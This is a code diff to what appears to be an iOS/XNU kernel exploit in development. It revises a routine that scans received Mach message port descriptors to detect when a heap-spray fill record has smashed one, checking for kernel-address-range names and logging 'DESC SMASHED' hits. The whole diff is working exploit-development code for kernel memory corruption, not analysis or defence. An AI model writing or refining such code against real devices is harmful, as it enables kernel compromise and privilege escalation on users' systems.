@@ -44,7 +44,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P073_BUILD @"p073-second-table-v7c-portkind-p044shape"
+#define P073_BUILD @"p073-second-table-v7d-desc-scanfix"
 
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
 #define P073_MSG_SIZE     0x7FCu
@@ -340,17 +340,27 @@ static int p073_harvest_portkind(p073_held_t *v, uint32_t *descForgeOut) {
     for (uint32_t i = 0; i < cnt && i < 16; i++) {
         uint8_t *dp = rbuf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t)
                     + i * sizeof(mach_msg_port_descriptor_t);
-        uint32_t name, disp, type;
+        /* v7d layout, measured on the 00:26 run: {name u32 @0, pad u32 @4,
+           u16 type @8 (0 = PORT_DESCRIPTOR), u16 disp @10 (0x11 = COPY_SEND)}.
+           A fill record {sid u32, flags u32, tail 0x1000000001} landing on a
+           desc reads name=sid, pad=flags, type u16 = tail lo, disp u16 = tail
+           hi-half = 1 != 0x11 -> DETECTABLE. The v7c 4-byte reads at +4/+10
+           misflagged every clean desc (the 0x11 byte lives INSIDE the +8 u32).
+           */
+        uint32_t name, padw;
+        uint16_t dtype, ddisp;
         memcpy(&name, dp + 0, 4);
-        memcpy(&disp, dp + 4, 4);
-        memcpy(&type, dp + 8, 4);
-        BOOL forged = (type != MACH_MSG_PORT_DESCRIPTOR)
-                   || (disp != MACH_MSG_TYPE_COPY_SEND)
-                   || (name >= P073_KVA_MIN && name < P073_KVA_MAX);
-        if (forged) {
+        memcpy(&padw, dp + 4, 4);
+        memcpy(&dtype, dp + 8, 2);
+        memcpy(&ddisp, dp + 10, 2);
+        BOOL sm = (ddisp != MACH_MSG_TYPE_COPY_SEND) || (dtype != MACH_MSG_PORT_DESCRIPTOR)
+               || (name >= P073_KVA_MIN && name < P073_KVA_MAX);
+        if (sm) {
             forge++;
-            p073_log(@"  [+] DESC FORGED sentPost[%u] desc[%u] name=0x%08x disp=0x%08x type=0x%08x",
-                     v->index, i, name, disp, type);
+            p073_log(@"  [+] DESC SMASHED sentPost[%u] desc[%u] name=0x%08x pad=0x%08x "
+                     @"type=0x%04x disp=0x%04x (fill record: sid=%u flags=0x%08x tail=0x%04x%04x)",
+                     v->index, i, name, padw, dtype, ddisp,
+                     name, padw, ddisp, dtype);
         }
     }
     if (forge) {
